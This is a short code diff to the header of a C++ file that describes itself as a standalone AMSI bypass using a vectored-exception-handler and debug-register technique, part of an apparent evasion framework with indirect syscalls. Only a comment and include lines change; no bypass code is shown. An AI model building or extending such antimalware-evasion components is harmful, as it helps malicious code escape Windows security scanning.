@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 04: Standalone AMSI Bypass
  *
  * Implements a self-contained version of the VEH/DR AMSI bypass that can
@@ -8,7 +8,6 @@
  *===========================================================================*/
 
 #include "Atom_04_AMSI.h"
-#include "Atom_03_Sys.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
 #include <cstring>
